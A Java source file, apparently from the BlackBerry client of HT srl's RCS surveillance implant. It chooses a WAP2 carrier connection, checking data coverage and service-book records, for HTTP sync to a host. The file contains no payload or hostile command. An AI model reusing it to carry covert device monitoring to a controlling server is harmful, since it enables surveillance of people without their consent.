//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action.sync.transport;

import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class Wap2Transport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug("Wap2Transport", DebugLevel.INFORMATION);
    //#endif

    public Wap2Transport(String host) {
        super(host);
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable");
        //#endif
        String uid = getUid();
        
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo.isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);
        
        //#ifdef DEBUG
        debug.trace("isAvailable wap2: " + gprs + " & " + coverage);
        //#endif
        
        return coverage & gprs & uid != null;
    }

    private String getUid() {
        String uid = null;
        final ServiceBook sb = ServiceBook.getSB();
        final ServiceRecord[] records = sb.findRecordsByCid("WPTCP");
        for (int i = 0; i < records.length; i++) {
            if (records[i].isValid() && !records[i].isDisabled()) {
                if (records[i].getUid() != null
                        && records[i].getUid().length() != 0) {
                    if ((records[i].getCid().toLowerCase().indexOf("wptcp") != -1)
                            && (records[i].getUid().toLowerCase().indexOf(
                                    "wifi") == -1)
                            && (records[i].getUid().toLowerCase()
                                    .indexOf("mms") == -1)) {
                        uid = records[i].getUid();
                        break;
                    }
                }
            }
        }
        return uid;
    }

    protected String getSuffix() {
        String uid = getUid();
        if (uid != null) {
            // WAP2 Connection
            return ";deviceside=true;ConnectionUID=" + uid;
        }

        return "";
    }

    //#ifdef DEBUGS
    public String toString() {
        return "Wap2Transport " + host;
    }
    //#endif
}
